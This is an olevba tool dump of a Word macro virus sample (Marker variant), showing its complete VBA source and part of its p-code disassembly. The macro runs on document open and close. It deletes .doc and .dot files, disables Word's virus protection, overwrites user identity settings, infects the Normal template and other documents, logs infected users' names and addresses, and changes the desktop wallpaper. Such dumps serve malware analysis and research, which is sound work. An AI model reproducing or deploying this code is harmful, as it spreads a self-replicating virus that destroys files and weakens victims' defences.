olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.bo
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.bo - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


'Seline, Where are you dear
Const Marker = "<- this is a marker! by jonhehehe TheBest-versi212x"
Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim nmod As Object
Dim isd As String
Dim DS, NTS, DI, NTI As Boolean
Dim Jon, Users, LogData, LogFile As String
On Error Resume Next
AddIns.Unload True
Kill Options.DefaultFilePath(8) & "\*.doc"
Kill Options.DefaultFilePath(8) & "\*.dot"
Options.VirusProtection = False
Application.UserName = "JonMMx 2000"
Application.UserInitials = "MeMeX"
Application.UserAddress = "JonMMx2000@yahoo.com"
Application.EnableCancelKey = wdCancelDisabled
GoSub InsertIon
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
If WeekDay(Now()) = 1 Then GoSub ShowMe
GoTo Finish
InsertIon:
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
DI = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NTI = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)
If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If DI Then
   NTS = NormalTemplate.Saved
   Jon = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)
   For i = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, i, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   Jon = Jon & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
   NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
   NT.CodeModule.AddFromString Jon
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    Jon = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)
    AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
    AD.CodeModule.AddFromString Jon
    If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub ShowMe
Return
ShowMe:
Dim RootsyS As String
On Error Resume Next
 RootsyS = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open RootsyS & "\Jon.html" For Output As #1
 Print #1, "<Html>Partic<title>Welcome to Destroyer of the last Manillenium JontheBEST</title></head><Body><body bgcolor = '#FFF212' >"
 Print #1, "<center><p align='center'><font color='#800000'size='25'><strong>a Poet For My Dear Love</strong></font></p>"
 Print #1, "<p align='center'><font color='#000000' size='6'><strong><a href='mailto:iamwaiting@yahoo.com'>Dear Iin</a></strong></font> </p>"
 Print #1, "<font normal></center>To the very best that happen in mylifeadr"
 Print #1, "adrLong ago and in my mind, I can see your face lonely and lost in time "
 Print #1, "adrYou were gone since yester month But the memories, never would dissapear"
 Print #1, "adrI think of you, I THINK OF YOU.adr"
 Print #1, "adrYes it's true I can pretend. But the paint of blue, keep beat me till the end."
 Print #1, "adrYes it's hard to understand. Why you leaving me and all we dreaming on "
 Print #1, "adrDear Iin, I close my eyes and see your face.  That's all I have to do to be with you. "
 Print #1, "adrDear Iin, altough I can not touch your face.  I know what I can do to be with you "
 Print #1, "adrLong ago so faraway. But the light of blue, still living with me today."
 Print #1, "adrYou were gone since yester month.  But the memories never would dissapear."
 Print #1, "<center><font color='#245505' size='6'><strong>adrSpeed Hari</strong></font></center></Body></html>"
 Close #1
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = RootsyS & "\Jon.html"
Return
Finish:
End Sub
'Logfile -->

' 06:14:2518:14:25 -Kamis, 22 Jul 1999
' JonMMx 2000
' jonthebest@hotbot.com


' 09:07:259:07:25 -Sabtu, 24 Jun 2017
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:13:3712:13:37 AM AM-Saturday, 14 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:55:459:55:45 AM AM-Wednesday, 25 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:05:474:05:47 AM AM-Thursday, 26 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:41:387:41:38 PM PM-Friday, 27 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:43:2212:43:22 PM PM-Monday, 30 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:02:559:02:55 -Sabtu, 28 Agust 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:16:1314:16:13 -Jumat, 3 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:17:374:17:37 AM AM-Saturday, 4 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:42:399:42:39 PM PM-Monday, 6 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:14:289:14:28 PM PM-Monday, 6 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:08:3013:08:30 -Rabu, 22 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:05:5522:05:55 -Senin, 13 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:19:506:19:50 PM PM-Monday, 27 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:58:2110:58:21 PM PM-Tuesday, 28 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:00:182:00:18 PM PM-Tuesday, 28 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:14:154:14:15 PM PM-Friday, 1 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:43:128:43:12 AM AM-Saturday, 2 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:37:3915:37:39 -Kamis, 21 Okt 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:53:5617:53:56 -Kamis, 21 Okt 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:17:5611:17:56 -Jumat, 22 Okt 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:35:2520:35:25  PM-Sabtu, 23 Okt 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:19:1715:19:17  PM-Sabtu, 30 Okt 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:26:4219:26:42  PM-Minggu, 31 Okt 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:33:3914:33:39 -Senin, 1 Nop 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:59:3715:59:37 -Rabu, 3 Nop 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:17:311:17:31 PM PM-Tuesday, 4 May 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:23:511:23:51 PM PM-Monday, 8 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:12:189:12:18 AM AM-Monday, 15 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:18:2011:18:20 PM PM-Wednesday, 1 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:32:4810:32:48 PM PM-Tuesday, 30 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:19:5709:19:57 pm pm-Friday, 17 Dec 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:04:11:04:01 PM PM-Thursday, 3 Jan 1980
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:32:294:32:29 AM AM-Tuesday, 25 Jan 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:27:1511:27:15 PM PM-Sunday, 30 Jan 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:58:534:58:53 PM PM-Thursday, 2 Mar 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:56:233:56:23 PM PM-Friday, 3 Mar 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:51:489:51:48 PM PM-Sunday, 18 Jun 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:06:561:06:56 PM PM-Monday, 19 Jun 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:49:268:49:26 PM PM-Thursday, 29 Jun 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:03:320:03:03  PM-Thursday, 13 Jul 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:59:303:59:30 PM PM-Thursday, 3 Aug 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:35:563:35:56 PM PM-Tuesday, 3 Oct 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:54:34:54:03 PM PM-Thursday, 12 Oct 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:31:2212:31:22 PM PM-Monday, 27 Nov 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:11:3011:11:30 AM AM-Thursday, 14 Dec 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:18:5410:18:54 AM AM-Monday, 8 Jan 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:26:524:26:52 PM PM-Thursday, 22 Feb 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:28:83:28:08 PM PM-Monday, 26 Feb 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:48:61:48:06 PM PM-Monday, 16 Apr 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:28:334:28:33 PM PM-Wednesday, 9 May 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:49:808:49:08 -tirsdag, 26 jun 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:29:561:29:56 PM PM-Monday, 2 Jul 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:41:519:41:05 Grunge Grunge-Friday, 6 Jul 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:19:5523:19:55  odp.-úterý, 12 VI 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:33:3410:33:34 -Freitag, 7 Sep 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marker.bo
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 24770 bytes
' Line #0:
' Line #1:
' Line #2:
' 	QuoteRem 0x0000 0x001A "Seline, Where are you dear"
' Line #3:
' 	Dim (Const) 
' 	LitStr 0x0033 "<- this is a marker! by jonhehehe TheBest-versi212x"
' 	VarDefn Marker
' Line #4:
' 	FuncDefn (Private Sub Document_Open())
' Line #5:
' 	ArgsCall Document_Close 0x0000 
' Line #6:
' 	EndSub 
' Line #7:
' 	FuncDefn (Private Sub Document_Close())
' Line #8:
' 	Dim 
' 	VarDefn nmod (As Object)
' Line #9:
' 	Dim 
' 	VarDefn isd (As String)
' Line #10:
' 	Dim 
' 	VarDefn DS
' 	VarDefn NTS
' 	VarDefn DI
' 	VarDefn NTI (As Boolean)
' Line #11:
' 	Dim 
' 	VarDefn Jon
' 	VarDefn Users
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	LitVarSpecial (True)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #14:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0006 "\*.doc"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #15:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0006 "\*.dot"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #17:
' 	LitStr 0x000B "JonMMx 2000"
' 	Ld Application 
' 	MemSt UserName 
' Line #18:
' 	LitStr 0x0005 "MeMeX"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #19:
' 	LitStr 0x0014 "JonMMx2000@yahoo.com"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #20:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #21:
' 	GoSub InsertIon 
' Line #22:
' 	LineCont 0x0004 0A 00 03 00
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	GoSub LoggingIn 
' 	EndIf 
' Line #23:
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoSub ShowMe 
' 	EndIf 
' Line #24:
' 	GoTo Finish 
' Line #25:
' 	Label InsertIon 
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #27:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #28:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DI 
' Line #29:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NTI 
' Line #30:
' 	Ld DI 
' 	Ld NTI 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #31:
' 	Ld DI 
' 	IfBlock 
' Line #32:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St NTS 
' Line #33:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Jon 
' Line #34:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #35:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #36:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #37:
' 	Ld Users 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St Users 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	ElseBlock 
' Line #40:
' 	Ld Users 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 " '"
' 	Concat 
' 	St Users 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Next 
' Line #43:
' 	LineCont 0x0010 09 00 09 00 12 00 10 00 1E 00 09 00 29 00 09 00
' 	Ld Jon 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000E "hh:mm:sc AMPM-"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Users 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	St Jon 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #45:
' 	Ld Jon 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld NTS 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	Ld NTI 
' 	IfBlock 
' Line #49:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St DS 
' Line #50:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Jon 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #52:
' 	Ld Jon 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #53:
' 	Ld DS 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	Return 
' Line #57:
' 	Label LoggingIn 
' Line #58:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #59:
' 	GoSub ShowMe 
' Line #60:
' 	Return 
' Line #61:
' 	Label ShowMe 
' Line #62:
' 	Dim 
' 	VarDefn RootsyS (As String)
' Line #63:
' 	OnError (Resume Next) 
' Line #64:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St RootsyS 
' Line #65:
' 	Ld RootsyS 
' 	LitStr 0x0009 "\Jon.html"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x007A "<Html>Partic<title>Welcome to Destroyer of the last Manillenium JontheBEST</title></head><Body><body bgcolor = '#FFF212' >"
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006C "<center><p align='center'><font color='#800000'size='25'><strong>a Poet For My Dear Love</strong></font></p>"
' 	PrintItemNL 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0080 "<p align='center'><font color='#000000' size='6'><strong><a href='mailto:iamwaiting@yahoo.com'>Dear Iin</a></strong></font> </p>"
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "<font normal></center>To the very best that happen in mylifeadr"
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0048 "adrLong ago and in my mind, I can see your face lonely and lost in time "
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004B "adrYou were gone since yester month But the memories, never would dissapear"
' 	PrintItemNL 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "adrI think of you, I THINK OF YOU.adr"
' 	PrintItemNL 
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0051 "adrYes it's true I can pretend. But the paint of blue, keep beat me till the end."
' 	PrintItemNL 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004A "adrYes it's hard to understand. Why you leaving me and all we dreaming on "
' 	PrintItemNL 
' Line #75:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0059 "adrDear Iin, I close my eyes and see your face.  That's all I have to do to be with you. "
' 	PrintItemNL 
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0055 "adrDear Iin, altough I can not touch your face.  I know what I can do to be with you "
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004A "adrLong ago so faraway. But the light of blue, still living with me today."
' 	PrintItemNL 
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004D "adrYou were gone since yester month.  But the memories never would dissapear."
' 	PrintItemNL 
' Line #79:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0063 "<center><font color='#245505' size='6'><strong>adrSpeed Hari</strong></font></center></Body></html>"
' 	PrintItemNL 
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #81:
' 	Ld RootsyS 
' 	LitStr 0x0009 "\Jon.html"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #82:
' 	Return 
' Line #83:
' 	Label Finish 
' Line #84:
' 	EndSub 
' Line #85:
' 	QuoteRem 0x0000 0x000B "Logfile -->"
' Line #86:
' Line #87:
' 	QuoteRem 0x0000 0x0025 " 06:14:2518:14:25 -Kamis, 22 Jul 1999"
' Line #88:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #89:
' 	QuoteRem 0x0000 0x0016 " jonthebest@hotbot.com"
' Line #90:
' Line #91:
' Line #92:
' 	QuoteRem 0x0000 0x0024 " 09:07:259:07:25 -Sabtu, 24 Jun 2017"
' Line #93:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #94:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' 	QuoteRem 0x0000 0x002D " 12:13:3712:13:37 AM AM-Saturday, 14 Aug 1999"
' Line #100:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #101:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' 	QuoteRem 0x0000 0x002D " 09:55:459:55:45 AM AM-Wednesday, 25 Aug 1999"
' Line #107:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #108:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' 	QuoteRem 0x0000 0x002C " 04:05:474:05:47 AM AM-Thursday, 26 Aug 1999"
' Line #114:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #115:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' 	QuoteRem 0x0000 0x002A " 07:41:387:41:38 PM PM-Friday, 27 Aug 1999"
' Line #121:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #122:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' 	QuoteRem 0x0000 0x002B " 12:43:2212:43:22 PM PM-Monday, 30 Aug 1999"
' Line #128:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #129:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' 	QuoteRem 0x0000 0x0026 " 09:02:559:02:55 -Sabtu, 28 Agust 1999"
' Line #135:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #136:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' 	QuoteRem 0x0000 0x0024 " 02:16:1314:16:13 -Jumat, 3 Sep 1999"
' Line #142:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #143:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' 	QuoteRem 0x0000 0x002B " 04:17:374:17:37 AM AM-Saturday, 4 Sep 1999"
' Line #149:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #150:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' 	QuoteRem 0x0000 0x0029 " 09:42:399:42:39 PM PM-Monday, 6 Sep 1999"
' Line #156:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #157:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' 	QuoteRem 0x0000 0x0029 " 09:14:289:14:28 PM PM-Monday, 6 Sep 1999"
' Line #163:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #164:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' 	QuoteRem 0x0000 0x0024 " 01:08:3013:08:30 -Rabu, 22 Sep 1999"
' Line #170:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #171:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' Line #176:
' 	QuoteRem 0x0000 0x0025 " 10:05:5522:05:55 -Senin, 13 Sep 1999"
' Line #177:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #178:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #179:
' Line #180:
' Line #181:
' Line #182:
' Line #183:
' 	QuoteRem 0x0000 0x002A " 06:19:506:19:50 PM PM-Monday, 27 Sep 1999"
' Line #184:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #185:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' Line #190:
' 	QuoteRem 0x0000 0x002C " 10:58:2110:58:21 PM PM-Tuesday, 28 Sep 1999"
' Line #191:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #192:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #193:
' Line #194:
' Line #195:
' Line #196:
' Line #197:
' 	QuoteRem 0x0000 0x002B " 02:00:182:00:18 PM PM-Tuesday, 28 Sep 1999"
' Line #198:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #199:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #200:
